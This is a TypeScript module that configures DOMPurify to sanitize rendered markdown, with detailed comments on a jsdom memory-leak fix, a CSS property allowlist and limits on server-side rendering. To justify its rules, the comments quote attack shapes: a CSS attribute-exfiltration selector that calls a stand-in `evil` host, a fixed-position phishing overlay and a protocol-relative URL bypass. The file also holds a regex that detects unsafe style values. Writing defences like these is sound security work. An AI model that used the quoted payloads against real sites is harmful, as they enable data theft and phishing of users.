/**
 * `isomorphic-dompurify` must stay on a release whose jsdom is >= 30.
 *
 * It builds ONE jsdom `Window` for the life of the process and parses every
 * `sanitize()` call into a fresh `Document` hanging off it. jsdom <= 29 built a
 * `DOMSelector` eagerly in the Document constructor, and
 * `@asamuzakjp/dom-selector`'s `Finder` registers nine listeners (`focus`,
 * `focusin`, `keydown`, `keyup`, `mouseover`, `mousedown`, `mouseup`, `click`,
 * `mouseout`) on that shared window so `:hover`/`:focus`/`:active` work. The
 * class has no removal path, so the listener arrays grew by nine per sanitize
 * for ever and each listener retained the Document behind it: ~7.3 KB retained
 * per call, dead linear, with a forced full GC reclaiming nothing. That is what
 * killed the SSR pods with `Reached heap limit` roughly every 15 hours.
 *
 * jsdom 30 makes the selector engine lazy (`_getDOMSelector()`), and DOMPurify
 * never queries a selector, so no `Finder` is constructed at all. The fix is
 * therefore jsdom's laziness, NOT an upstream repair: a future jsdom that goes
 * back to constructing the selector eagerly reintroduces this in full.
 * `tests/sanitizer-jsdom-leak.test.mjs` is what notices — it fails on jsdom 28.
 *
 * The second, and larger, leak is  and is fixed below by
 * `releaseThrowawayDocument()`. jsdom's `living/window-properties.js` keeps a
 * module-level `WeakMap<Window, Map<string, Set<Element>>>` for named property
 * access (`window.someId`), adds every parsed element carrying an `id` — or a
 * `name`, on `embed`/`form`/`img`/`object`/`iframe`/`frame` — and removes it
 * only in `elementDetached()`. DOMPurify never detaches: it serializes
 * `body.innerHTML` and drops the throwaway Document on the floor. So the `Set`
 * on the SHARED window holds the element for ever, and one held element drags
 * its whole Document in behind it through jsdom's `SymbolTree` sibling links.
 * Every heading here gets an `id` from `marked-gfm-heading-id`, so this fired
 * on essentially every article and every `/trending` card. Present in jsdom 28
 * and 30 alike — not a regression from the bump above.
 */
import DOMPurify from "isomorphic-dompurify";

/**
 * DANGER — read before adding a `data-*` entry to ADD_ATTR.
 *
 * `ALLOWED_URI_REGEXP` below is applied to URI attributes DOMPurify knows about
 * (`src`, `href`, …). It is NOT applied to `data-*`. A `data-*` attribute
 * therefore passes through verbatim, including `javascript:` and
 * `data:text/html;base64,…`, even though the identical string would be stripped
 * from `src`.
 *
 * That is only safe while every consumer that feeds a `data-*` value into a URL
 * sink (`el.src`, `el.href`, `window.open`, `location =`) re-validates the
 * scheme itself. THEY DO NOT DO SO BY ACCIDENT — an earlier revision of this
 * comment claimed the `data-*-url` values were treated as opaque text, and that
 * was simply false: `data-audio-url` reached `<audio src>` and
 * `data-embed-url` reached both `<iframe src>` and `<a href>` with no check at
 * all. The re-validation now lives at the sinks, and that is the ONLY thing
 * keeping this boundary safe:
 *
 *   data-audio-url  MarkdownContent -> MarkdownAudio   (getSafeMediaUrl)
 *   data-embed-url  MarkdownContent -> ExternalEmbed   (getSafeHttpUrl)
 *   data-video-url  MarkdownContent -> MarkdownVideo   (getSafeMediaUrl)
 *   data-qr-value   MarkdownContent -> MarkdownQrCode  (encoded into a bitmap
 *                                                       and shown as text; not
 *                                                       a URL sink)
 *
 * If you carry a URL through this boundary, validate the scheme at the point of
 * use with `getSafeHttpUrl` / `getSafeMediaUrl` from./safe-url.ts — do not
 * assume this allowlist did it for you, and do not write a `javascript:`
 * blocklist, which loses to case, tabs, entities and leading control
 * characters. Covered by tests/markdown.test.mjs → "sanitizer does not
 * URL-filter data-*".
 */
export const markdownSanitizeOptions = {
  ADD_TAGS: ["audio", "video", "source"],
  /**
   * `<style>` is in DOMPurify's default tag allowlist and NOTHING in this
   * pipeline emits one: `renderer.html` escapes all author-supplied raw HTML,
   * marked never generates a `<style>`, KaTeX emits inline `style=` attributes
   * only, and mermaid SVG goes through a separate sanitizer
   * (`sanitizeMermaidSvg`, `USE_PROFILES`) that this config cannot affect. So
   * the only way one can appear here is through a bug — which is exactly what
   *  was, and the `<style>` allowance is what upgraded it from an inert
   * attribute breakout to page-wide CSS: defacement, attribute exfiltration
   * via `input[value^="a"]{background:url(//evil/a)}`, and a `position:fixed`
   * full-viewport phishing overlay.
   *
   * Beware the false negative when checking this by hand: a BARE `<style>` was
   * already dropped before this entry existed (DOMPurify treats it as
   * out-of-place at the top level), while a NESTED one —
   * `<a aria-label="x"><style>…</style></a>`, the  shape — survived. Test
   * the nested form.
   *
   * `style` is also in DOMPurify's default FORBID_CONTENTS, so forbidding the
   * tag removes the CSS text with it rather than dumping it on the page.
   */
  /**
   * Form controls are in DOMPurify's default allowlist and markdown cannot
   * produce one either — no marked renderer, extension or plugin here emits a
   * `<form>`, `<input>` or `<button>`. Keeping them allowed means any future
   * breakout gets a credential-capture surface for free, which is the
   * expensive half of a phishing overlay: the remaining CSS allowlist can
   * still paint a coloured box (`position:relative;top:-100vh;height:100vh`),
   * but a box with no password field and no submit target is defacement, not
   * theft.
   */
  FORBID_TAGS: [
    "button",
    "form",
    "input",
    "label",
    "option",
    "select",
    "style",
    "textarea",
  ],
  ADD_ATTR: [
    "aria-describedby",
    "aria-hidden",
    "aria-label",
    "class",
    "controls",
    "data-audio-url",
    "data-embed-url",
    "data-markdown-author-link",
    "data-video-url",
    // The poster frame for a video embed. `poster` is a live URL
    // sink, so it is subject to ALLOWED_URI_REGEXP below; `data-video-poster`
    // is not (DOMPurify does not apply the URI policy to `data-*`) and is
    // re-validated with `getSafeMediaUrl` at the `<video poster>` sink in
    // MarkdownVideo.svelte, exactly as `data-video-url` is.
    //
    // NOTE `poster` is ALSO in DOMPurify's own default attribute allowlist,
    // like `preload` and `type` -- which is why those survive today without
    // appearing here. It is listed explicitly anyway: ADD_ATTR is the file
    // someone reads to find out what this pipeline may emit, and a
    // dependency's default list is not a contract we control.
    "data-video-poster",
    "poster",
    "data-footnote-backref",
    "data-footnote-ref",
    "data-footnotes",
    "data-qr-value",
    // Inert loading hints emitted by renderArticleImage. No URL, no script.
    "decoding",
    // Per-block text direction on `<pre>`, inline `<code>` and a bare-URL
    // anchor. `dir` is in DOMPurify's own default allowlist, so this
    // line changes nothing today — it is here because ADD_ATTR is the file
    // someone reads to find out what this pipeline may emit, and a
    // dependency's default list is not a contract we control. Losing it would
    // silently drop the isolate that keeps a shell transcript readable inside
    // Arabic prose, and nothing about the page would look broken enough to
    // investigate.
    "dir",
    "fetchpriority",
    "href",
    "id",
    "loading",
    "src",
    "target",
    "title",
    "alt",
    "rel",
  ],
  /**
   * Scheme allowlist for `src`/`href`/… — anything not matched here loses the
   * attribute entirely.
   *
   * Accepts: `http:`, `https:`, `mailto:`, `tel:`, a root-relative path
   * (`/a/b`), a query or fragment (`?q`, `#x`), a relative path (`a/b`,
   * `a.png`), and the empty string. Everything else — `javascript:`, `data:`,
   * `vbscript:`, `blob:`, a scheme nobody has invented yet — is rejected by
   * being absent, not by being listed.
   *
   * The trailing branch is `[^:/?#]+` and not `[^:/?#]*` on purpose. With `*`
   * it matched the empty string and then `[/?#]`, so `//evil.example/a.png`
   * passed as a "relative path" and the `\/(?!\/)` branch that exists
   * specifically to reject protocol-relative URLs did nothing .
   * The `+` forces a real first path segment, so `//host` now takes the
   * `\/(?!\/)` branch and is rejected, and the alternation finally means what
   * it reads as. Note the deliberate consequence: an author writing
   * `![x](//host/a.png)` loses the `src` and must write `https://`.
   */
  ALLOWED_URI_REGEXP:
    /^(?:(?:https?|mailto|tel):|\/(?!\/)|[#?]|[^:/?#]+(?:[/?#]|$)|$)/i,
};

/**
 * CSS properties an inline `style=` attribute may carry.
 *
 *  asked for `<style>` to be forbidden; the follow-up correction on that
 * issue is the important half: forbidding the ELEMENT does nothing about the
 * ATTRIBUTE, and the full-viewport phishing overlay from  is pure
 * `style=` with no `<style>` anywhere:
 *
 *   <a style="position:fixed;inset:0;z-index:2147483647;background:#fff" …>
 *
 * `style` is not in our ADD_ATTR — it arrives from DOMPurify's own default
 * allowlist — and it cannot simply be forbidden either, because ONE
 * `$$\frac{a}{b}$$` emits ten `style="…"` attributes and a blanket forbid
 * breaks every equation on the platform.
 *
 * So this is a property allowlist, and it is not guesswork: it is exactly the
 * set KaTeX can emit (`style.<prop>` assignments in katex@0.18 dist) plus
 * `text-align` in case a future `marked` goes back to styling table alignment
 * instead of using `align=`. Nothing else in the pipeline emits an inline
 * style at all — highlight.js emits classes, and author raw HTML is escaped.
 *
 * What is deliberately NOT here is the whole overlay/exfiltration toolkit:
 * `z-index`, `opacity`, `visibility`, `display`, `transform`, `filter`,
 * `pointer-events`, `background`/`background-image` (the `url()` shorthand),
 * `inset`, `right`, `max-*`, `overflow`, `float`, `cursor`, `animation`,
 * `content`. A style ATTRIBUTE cannot create a pseudo-element, so `content`
 * and the `::after` defacement die with the `<style>` element regardless.
 *
 * Raise this set only against measured output of the real pipeline. Adding
 * `position: fixed` or `z-index` re-opens 's impact.
 */
const ALLOWED_STYLE_PROPERTIES = new Set([
  "background-color",
  "border-bottom-width",
  "border-color",
  "border-right-style",
  "border-right-width",
  "border-style",
  "border-top-width",
  "border-width",
  "bottom",
  "color",
  "height",
  "left",
  "margin",
  "margin-left",
  "margin-right",
  "margin-top",
  "min-width",
  "padding-left",
  "position",
  "text-align",
  "text-shadow",
  "top",
  "vertical-align",
  "width",
]);

/**
 * Properties whose VALUE is allowlisted too.
 *
 * KaTeX only ever emits `position: relative` (one assignment,
 * `style.position = "relative"`, for `\overline`/`\underline` rules). Keeping
 * `position` at all is what makes `top`/`left`/`bottom` meaningful, so it is
 * pinned to the two values that cannot pin an element to the viewport:
 * `fixed` and `sticky` are the overlay primitives and are not reachable.
 */
const ALLOWED_STYLE_VALUES: Record<string, Set<string>> = {
  position: new Set(["relative", "static"]),
};

/**
 * Value-level rejects, applied to every declaration that survives the property
 * allowlist. `url(` is the exfiltration channel, `\` is the CSS escape that
 * would smuggle it back in (`\75 rl(…)`), and `<`/`>`/`{`/`}` plus comment
 * markers are shapes a legitimate KaTeX length or colour never contains.
 */
const UNSAFE_STYLE_VALUE = /url\(|expression|@import|[\\<>{}]|\/\*|\*\//i;

/**
 * Strip an inline style down to the allowlist. Exported for tests.
 */
export function filterInlineStyle(value: string): string {
  if (!value || value.length > 4096) {
    return "";
  }

  const kept: string[] = [];

  // Splitting on ";" is safe under an allowlist: no allowed property takes a
  // value that can legitimately contain one (quoted strings and `url()` data
  // URIs are the cases that could, and neither survives the checks below), so
  // a mis-split can only produce fragments that fail to match and get dropped.
  for (const declaration of value.split(";")) {
    const separator = declaration.indexOf(":");
    if (separator === -1) continue;

    const property = declaration.slice(0, separator).trim().toLowerCase();
    const propertyValue = declaration.slice(separator + 1).trim();
    if (!propertyValue || !ALLOWED_STYLE_PROPERTIES.has(property)) continue;
    if (UNSAFE_STYLE_VALUE.test(propertyValue)) continue;

    const allowedValues = ALLOWED_STYLE_VALUES[property];
    if (allowedValues && !allowedValues.has(propertyValue.toLowerCase())) {
      continue;
    }

    kept.push(`${property}:${propertyValue}`);
  }

  return kept.join(";");
}

function filterStyleAttributeHook(
  _node: Element,
  data: { attrName: string; attrValue: string; keepAttr: boolean },
) {
  if (data.attrName !== "style") {
    return;
  }

  const filtered = filterInlineStyle(data.attrValue);
  if (!filtered) {
    data.keepAttr = false;
    return;
  }

  data.attrValue = filtered;
}

/**
 * The Document DOMPurify parsed the current call into, captured so the call can
 * empty it afterwards. See `releaseThrowawayDocument`.
 *
 * Module-level mutable state is safe here for one reason and one reason only:
 * `DOMPurify.sanitize()` is fully synchronous, contains no `await`, and neither
 * of the hooks installed below yields or re-enters `sanitizeMarkdownHtml`. Node
 * cannot interleave another request into the middle of it. Do NOT make either
 * hook async, and do not call `sanitizeMarkdownHtml` from inside a DOMPurify
 * hook — either would let two renders share this slot.
 */
let throwawayDocument: Document | null = null;

/**
 * Record the Document DOMPurify built for this call.
 *
 * `beforeSanitizeElements` fires for EVERY node the walk visits — the root
 * `body` first, then text nodes and comments as well as elements — and it fires
 * before anything can be removed. That is the point: an `afterSanitize*` hook
 * only sees nodes that survived, so a document whose every element was dropped
 * would never be captured. Cost is one call per node with an immediate return
 * once the slot is filled.
 */
function captureThrowawayDocumentHook(node: Node) {
  if (throwawayDocument === null) {
    throwawayDocument = node.ownerDocument;
  }
}

/**
 * Detach everything DOMPurify parsed, so jsdom stops retaining it. THE FIX FOR
 *  read the header comment for the mechanism.
 *
 * Removing `documentElement` runs jsdom's removal steps, which call `_detach()`
 * on the node and recurse into its whole subtree
 * (`Node-impl.js`); `Element-impl._detach()` calls
 * `windowProperties.elementDetached()`, which is the ONLY thing that deletes an
 * element from the shared window's named-property tracker. It also drops the
 * document's `_byIdCache`. After this the Document is unreachable and collects
 * normally.
 *
 * Measured on the built adapter-node server, `/trending` with 12 heading-bearing
 * cards, retained heap after a forced full major GC in the server process:
 * 1,546 KB per render before, 0 (in fact slightly negative — GC noise) after.
 * Isolated through `isomorphic-dompurify`, 600 calls on a two-heading fixture:
 * 90,869 B/sanitize at 0.468 ms before, and after this change a fixed ~420 KB
 * one-off with a MARGINAL cost of 6.9 B/sanitize measured across 600 → 4,800
 * calls, at 0.563 ms. It is flat, not merely slower.
 *
 * WHY NOT `clearWindow()`, which is what  proposed and what
 * isomorphic-dompurify 3 added for exactly this. Three reasons, all measured on
 * the same probe:
 *
 *  1. It does not actually stop the leak, it rations it. Every 20 calls still
 *     leaves a MARGINAL 120 B/sanitize (488 KB retained at 600 calls, 705 KB at
 *     2,400) because up to 19 documents are alive at any moment. Emptying is
 *     bounded at zero, per call.
 *  2. The worst case is unbounded in the wrong dimension. A call-count cadence
 *     is blind to document SIZE, and the cost table further down this file has
 *     single articles that parse to 3.4 MB of HTML. Nineteen of those is tens of
 *     MB of residual against a 320 MB `--max-old-space-size`. Bytes- or
 *     time-driven cadences fix that dimension but not the first problem, and
 *     they all need a threshold nobody can derive from anything.
 *  3. It is a footgun. `clearWindow()` does `window.close()` and then rebuilds
 *     BOTH the window and the DOMPurify instance (`purify = DOMPurifyFactory(...)`),
 *     which silently discards every registered hook and any `setConfig`. Today
 *     that is survivable only because the hooks below are installed per call; the
 *     day someone moves `filterStyleAttributeHook` to module scope — the obvious
 *     "optimisation" — a window swap would silently turn the inline-`style`
 *     allowlist off, and nothing would fail. Not a lifecycle worth owning for a
 *     fix that is also slower (0.663 ms/sanitize at every-20) and leakier.
 *
 * Also rejected: dropping `marked-gfm-heading-id` on the `extractPlainText`
 * path. It would have bounded `/trending` but left every article render leaking
 * the ids exist because the rendered article needs anchors — and it fixes the
 * symptom one caller at a time.
 *
 * This is a workaround, not a repair. A Document whose only reference is jsdom's
 * own named-property tracker is unreachable by definition, so the tracker wants
 * a `WeakRef`/`FinalizationRegistry` or per-document teardown; worth filing
 * upstream at jsdom, after which this can go.
 *
 * A failure here must not take the page down: the string is already serialized
 * by the time this runs, so the sanitize itself has succeeded. Log instead —
 * ONCE, because this runs on every card of every list page and a per-call
 * `console.error` at that rate is its own outage. A silent no-op is how this
 * comes back, so `tests/sanitizer-named-property-leak.test.mjs` measures bytes
 * and is what actually notices in CI.
 */
let releaseFailureLogged = false;

function logReleaseFailureOnce(message: string, error?: unknown) {
  if (releaseFailureLogged) {
    return;
  }
  releaseFailureLogged = true;
  console.error(`markdown-sanitize: ${message} (logged once)`, error ?? "");
}

function releaseThrowawayDocument() {
  const parsed = throwawayDocument;
  throwawayDocument = null;
  if (!parsed) {
    return;
  }

  // Refuse to empty anything that is not a throwaway. `_initDocument` always
  // parses into a document with no browsing context — `DOMParser` in jsdom, or
  // `implementation.createDocument` in the fallback — so `defaultView` is
  // `null`. The one document that is NOT safe to touch is the shared window's
  // own, and that is exactly the one whose `defaultView` IS the window. No
  // current DOMPurify path can hand us that; this makes the mistake impossible
  // rather than merely unlikely, and it costs one property read.
  //
  // The failure mode of the guard is that it silently stops releasing, so it
  // must not be the only thing standing here — hence the byte-counting test.
  if (parsed.defaultView !== null) {
    logReleaseFailureOnce(
      "refusing to empty a document that has a browsing context; the #1467 leak is BACK",
    );
    return;
  }

  try {
    parsed.documentElement?.remove();
  } catch (error) {
    logReleaseFailureOnce("could not release the jsdom document", error);
  }
}

/**
 * Markdown is sanitized at the utility boundary so every consumer is safe,
 * including any future consumer that does not use MarkdownContent.
 *
 * The hooks are added and removed around the call rather than registered once at
 * module load because DOMPurify hooks are GLOBAL to the instance, and
 * `isomorphic-dompurify` hands the same instance to every caller in the app —
 * including `sanitizeMermaidSvg` (SVG, needs its own style vocabulary) and the
 * Iframely embed sanitizer. A permanently installed hook would silently apply
 * this markdown-shaped CSS allowlist to those too. `sanitize()` is synchronous
 * and JS is single-threaded, so nothing can observe the window in between.
 *
 * Those two other call sites are browser-only — `sanitizeEmbedHtml` is reached
 * from `ExternalEmbed.svelte` writing `iframelyContainer.innerHTML`, and
 * `sanitizeMermaidSvg` from mermaid's client render — so they never touch the
 * jsdom window and need no release of their own. If either ever runs on the
 * server, it needs this treatment too.
 */
export function sanitizeMarkdownHtml(content: string) {
  throwawayDocument = null;
  DOMPurify.addHook("beforeSanitizeElements", captureThrowawayDocumentHook);
  DOMPurify.addHook("uponSanitizeAttribute", filterStyleAttributeHook);
  try {
    return DOMPurify.sanitize(content, markdownSanitizeOptions);
  } finally {
    DOMPurify.removeHook("uponSanitizeAttribute", filterStyleAttributeHook);
    DOMPurify.removeHook(
      "beforeSanitizeElements",
      captureThrowawayDocumentHook,
    );
    releaseThrowawayDocument();
  }
}

/**
 * Ceilings on the HTML a component will re-sanitize in order to emit a
 * server-rendered snapshot of the body.
 *
 * Emitting the body into markup means one extra full DOM parse per SSR render,
 * on top of the one `processMarkdown` already does, and that parse is
 * synchronous: while it runs, this pod answers nothing else, `/healthz`
 * included.  and  are what that costs when it goes wrong. Markdown
 * amplifies hard, so "one article" is not a bounded amount of work — measured
 * against the SSR bundle, at the backend's 100,000-character `zPage.content`
 * limit unless noted:
 *
 *   shape                        HTML   elements  depth  processMarkdown  extra pass
 *   long prose + headings       110 KB      ~850      3    57 ms /  31 MiB   45 ms
 *   nothing but code fences     550 KB    ~13.4k      4   253 ms / 159 MiB   33 ms
 *   inline KaTeX throughout     3.4 MB      ~83k      9  1649 ms / 491 MiB   88 ms
 *   nothing but 1-word paras    200 KB    ~16.7k      2  1671 ms / 169 MiB  218 ms
 *   3.8 KB of `>`x1900 quotes   100 KB     ~3.8k   1900  1435 ms          1478 ms
 *
 * Three dimensions, not one, and the last row is why. That article is 3.8 KB of
 * source — it passes any byte or element ceiling you would write — yet the
 * extra pass costs 1.5 seconds, because parse and serialize cost is superlinear
 * in tree DEPTH. Bound all three.
 *
 * Note also that `processMarkdown` is already the larger hazard in every row.
 * That is pre-existing and out of scope here; it is the reason these ceilings
 * are set to keep this PR's addition small rather than to make the route safe.
 *
 * The numbers below are lengths and counts, not bytes: `content.length` is
 * UTF-16 code units, so an article in Spanish, Portuguese or Cyrillic can carry
 * 2-3x this many bytes, and CJK more. Sizing is deliberately in the units the
 * parser actually walks.
 *
 * These ceilings keep every shape that is plausibly a real article: a survey of
 * 80 published zPages found a maximum of 1,212 `<`, 15% of the element ceiling,
 * and none dropped.
 *
 * Worst ADMITTED case, searched for rather than assumed — the most expensive
 * document that satisfies all three ceilings — measured at 130 ms / 7 MiB
 * (depth 60, 7,320 `<`). The next worst are 76 ms / 11 MiB (80 KaTeX
 * equations) and 56 ms / 1 MiB (377k characters of near-tagless prose). The
 * three counterexamples that motivated the depth ceiling — `>`x1900 x2,
 * `>`x900 x4, `>`x1000 x3, previously 1478 / 755 / 653 ms — now cost 0 ms.
 *
 * Raise a ceiling if real content starts hitting one; do not raise it on
 * principle, and re-measure the worst admitted case when you do.
 */
export const SSR_MARKUP_MAX_CHARS = 393_216;
/**
 * Counted as `<` occurrences, which is openers AND closers, so this is ~4,000
 * elements. Do not "fix" the name into a per-element count without re-measuring
 * the cost table above was taken against this metric.
 */
export const SSR_MARKUP_MAX_TAGS = 8_000;
/**
 * Nesting depth. Real markdown is shallow: a blockquote holding a list holding
 * a paragraph is 6. 64 is an order of magnitude of headroom and still an order
 * of magnitude below where the superlinear cost starts to bite.
 */
export const SSR_MARKUP_MAX_DEPTH = 64;

/** Elements that never close, and so must not open a level in the depth scan. */
const VOID_ELEMENTS = new Set([
  "area",
  "base",
  "br",
  "col",
  "embed",
  "hr",
  "img",
  "input",
  "link",
  "meta",
  "param",
  "source",
  "track",
  "wbr",
]);

/**
 * One pass over the string yielding both structural dimensions.
 *
 * `tags` counts `<` — openers, closers and all — because that is the metric the
 * cost table was measured against. `depth` tracks the element stack, skipping
 * void elements (which never close and would otherwise ratchet the count up on
 * an image-heavy article) and comments/doctypes.
 *
 * Bails out as soon as either limit is exceeded, so a pathological document
 * costs a partial scan rather than a full one.
 */
export function measureMarkupShape(
  content: string,
  maxTags: number,
  maxDepth: number,
) {
  let tags = 0;
  let depth = 0;
  let maxSeenDepth = 0;
  let index = content.indexOf("<");

  while (index !== -1) {
    tags += 1;
    if (tags > maxTags) return { tags, depth: maxSeenDepth, exceeded: true };

    const next = content.charCodeAt(index + 1);

    if (next === 47 /* "/" */) {
      if (depth > 0) depth -= 1;
    } else if (next === 33 /* "!" */ || next === 63 /* "?" */) {
      // Comment, doctype or processing instruction: not an element.
    } else {
      // Read the tag name to decide whether it opens a level.
      let end = index + 1;
      while (end < content.length) {
        const code = content.charCodeAt(end);
        const isNameChar =
          (code >= 97 && code <= 122) || // a-z
          (code >= 65 && code <= 90) || // A-Z
          (code >= 48 && code <= 57); // 0-9
        if (!isNameChar) break;
        end += 1;
      }

      const name = content.slice(index + 1, end).toLowerCase();
      if (name && !VOID_ELEMENTS.has(name)) {
        depth += 1;
        if (depth > maxSeenDepth) maxSeenDepth = depth;
        if (depth > maxDepth) {
          return { tags, depth, exceeded: true };
        }
      }
    }

    index = content.indexOf("<", index + 1);
  }

  return { tags, depth: maxSeenDepth, exceeded: false };
}

/**
 * Sanitize for direct emission into markup (`{@html}`).
 *
 * Returns `""` above any ceiling. That decision is deliberately a pure function
 * of the string — server and client must agree on the snapshot or hydration
 * would mismatch — and an empty snapshot is exactly the pre- behaviour: the
 * body is built client-side instead. So exceeding a ceiling costs a
 * crawler-visible body, never a broken page. Callers surface the fallback (see
 * `data-ssr-body` in MarkdownContent) so it is greppable rather than silent.
 *
 * SECURITY — this function is the last gate before `{@html}`, and on the SSR
 * path it is the ONLY one: pre- the browser re-sanitized everything on
 * mount, and now `setContent()` deliberately skips that write to reuse the
 * server's nodes. What makes that safe is upstream and load-bearing:
 * `markdown.ts`'s `renderer.html` escapes ALL author-supplied raw HTML, so no
 * user-authored tag ever reaches this function in the first place — DOMPurify
 * here is defence in depth over generated markup, not the primary filter. If
 * that renderer ever changes to pass raw HTML through, this becomes the primary
 * filter for content the document parser will execute. `tests/markdown.test.mjs`
 * pins the escaping invariant; keep it pinned.
 */
export function sanitizeMarkdownHtmlForMarkup(content: string) {
  if (!content || content.length > SSR_MARKUP_MAX_CHARS) {
    return "";
  }

  const shape = measureMarkupShape(
    content,
    SSR_MARKUP_MAX_TAGS,
    SSR_MARKUP_MAX_DEPTH,
  );
  if (shape.exceeded) {
    return "";
  }

  return sanitizeMarkdownHtml(content);
}
